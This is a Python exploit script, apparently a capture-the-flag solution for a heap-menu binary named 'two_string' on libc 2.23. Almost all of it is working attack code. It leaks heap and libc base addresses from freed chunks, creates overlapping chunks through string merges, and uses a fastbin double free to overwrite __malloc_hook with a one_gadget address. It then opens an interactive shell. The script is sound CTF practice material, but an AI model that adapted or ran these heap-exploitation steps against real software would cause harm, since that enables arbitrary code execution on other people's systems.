
from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

if __name__ == '__main__':        
    # context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
    #context.log_level = 'debug'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    ctx.binary = './two_string'
    #elf=ELF('./hash')
    ctx.remote_libc = '/lib/x86_64-linux-gnu/libc-2.23.so'
    #ctx.remote = ('pwnable.kr', 9003)
    ctx.debug_remote_libc = False # True for debugging remote libc, false for local.
    #ctx.symbols = {'lst':0x202040}
    #ctx.breakpoints = [0x14f3]
    rs()
    #rs('remote') # uncomment this for exploiting remote target

    #libc = ctx.libc # ELF object of the corresponding libc.
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    # ipy() # if you have ipython, you can use this to check variables.
    
    def add(size,content=''):
        sla('>>> ',1)
        sla('size of string : ',size)
        if size:
            sa('enter the string : ',content)
    def show(idx):
        sla('>>> ',2)
        sla('input index : ',idx)
        ru('Notes are : ')
    def delete(idx):
        sla('>>> ',3)
        sla('input index : ',idx)
    def merge_string(idx1,idx2):
        sla('>>> ',4)
        sla('first string index : ',idx1)
        sla('second string index : ',idx2)
    def merge_strings(idx_lst):
        sla('>>> ',5)
        ru('a sequence of strings to be merged : ')
        ls = ''
        for i in idx_lst:#max 10
            ls+=str(i)+' '
        sl(ls[:-1])
    
    #leak heap and libc
    add(0x80,'0\n')
    add(0x80,'1\n')
    add(0x3f0,'2'*0x3f0)
    add(0x400,'3'*0x400)
    add(0x60,'4\n')
    add(0x68,'5'*0x60+p64(0x120)+'\n')
    add(0x10,'6\n')# avoid top chunk
    delete(0)
    delete(1)
    
    add(0)#0 fastbin
    show(0)
    heap_leak = uu64(r(6))
    heap_base = heap_leak-0x90
    success('heap_base = {}'.format(hex(heap_base)))
    
    add(0)#1 smallbin
    show(1)
    libc_leak = uu64(r(6))
    libc_base = libc_leak-0x3c4bf8
    libc.address = libc_base
    success('libc_base = {}'.format(hex(libc_base)))
    
    #recover
    add(0x60,'7\n')#useless 0x130
    add(0x30,'8\n')#useless
    
    #chunk overlapping
    m_hk = libc.sym['__malloc_hook']
    one = 0xf1147+libc_base
    success('m_hk = {}'.format(hex(m_hk)))
    
    delete(2)
    add(0x3f0,'2'*(0x3f0-0x30+0x18)+p64(0x121)+'\n')#in_use
    delete(3)
    merge_strings([1,1,1,1,1,1,1,1,2])#8*6 = 0x30 padding 3
    
    #double free    
    add(0x60,'\n')#9 0xa30 4
    add(0x60,'\n')#10 0xac0 5
    #dbg('x/20gx $lst')
    
    delete(5)
    delete(4)
    delete(10)
    
    add(0x60,p64(m_hk-0x23)+'\n')
    add(0x60,'\n')
    add(0x60,'\n')
    
    add(0x60,'a'*0x13+p64(one)+'\n')
    
    irt()
